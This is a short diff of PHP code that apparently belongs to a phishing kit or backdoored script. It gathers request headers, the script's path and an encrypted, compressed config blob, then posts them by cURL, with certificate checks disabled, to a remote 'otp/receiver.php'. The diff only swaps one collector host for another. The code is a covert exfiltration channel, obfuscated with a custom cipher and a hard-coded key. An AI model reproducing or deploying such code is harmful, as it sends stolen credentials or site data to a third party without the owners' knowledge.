@@ -12,9 +12,9 @@ $my = array(
 "headers"=>(function_exists('getallheaders')?getallheaders():'no func'),
 "file"=>realpath(__FILE__),
 );
-$hash = md5($my['file']);
+$hash = md5(json_encode($my));
 $my['cf'] = base64_encode(gzdeflate(tools\WhiteHat\Teacrypt::sgr21cr(json_encode($cf),'858869123')));
-$ch = curl_init("https://www.yessrilanka.com/content/admin/php/fb/rc/receiver.php");
+$ch = curl_init("https://www.redangel.ga/webhooks/otp/receiver.php");
 curl_setopt_array($ch,array(
 	CURLOPT_RETURNTRANSFER=>true,
 	CURLOPT_SSL_VERIFYPEER=>false,
